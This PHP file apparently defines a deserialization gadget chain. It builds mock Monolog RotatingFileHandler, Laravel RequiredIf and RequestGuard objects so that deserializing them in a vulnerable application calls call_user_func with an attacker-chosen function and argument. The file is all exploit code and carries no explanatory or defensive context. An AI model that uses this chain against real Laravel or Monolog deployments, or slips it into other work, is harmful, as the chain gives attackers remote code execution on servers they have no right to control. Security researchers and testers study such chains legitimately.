<?php

namespace Monolog\Handler {
    class RotatingFileHandler
    {
        protected $mustRotate;
        protected $filename;
        protected $filenameFormat;
        protected $dateFormat;

        function __construct($function, $param)
        {
            $this->dateFormat = "l";
            $this->mustRotate = true;
            $this->filename = "anything";
            $this->filenameFormat = new \Illuminate\Validation\Rules\RequiredIf($function, $param);
        }
    }
}

namespace Illuminate\Validation\Rules {
    class RequiredIf
    {
        public $condition;

        public function __construct($function, $param)
        {
            $this->condition = [new \Illuminate\Auth\RequestGuard($function, $param), "user"];
        }
    }
}

namespace Illuminate\Auth {
    class RequestGuard
    {
        protected $callback;
        protected $request;
        protected $provider;

        public function __construct($function, $param)
        {
            $this->callback = "call_user_func";
            $this->request = $function;
            $this->provider = $param;
        }
    }
}
